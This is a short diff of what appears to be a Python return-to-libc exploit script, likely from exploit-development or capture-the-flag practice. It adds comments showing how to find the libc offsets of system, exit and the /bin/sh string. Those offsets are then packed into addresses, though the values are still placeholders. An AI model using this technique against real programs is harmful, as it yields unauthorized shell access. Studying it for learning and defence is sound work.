@@ -3,9 +3,15 @@ import struct
 #ldd bin | grep libc
 libc_base = libc_addr
 
-#TODO: reaseach how to get this addrs
+#readelf -s /lib/i386-linux-gnu/libc.so.6| grep system
+#choose system of libc
 system_offset = 0x0
+
+#readelf -s /lib/i386-linux-gnu/libc.so.6| grep exit
+#choose exit of libc
 exit_offset = 0x0
+
+#strings -a -t x /lib/i386-linux-gnu/libc.so.6| grep /bin/sh
 shell_offset = 0x0
 
 system = struct.pack("<I", libc_base + system_offset)
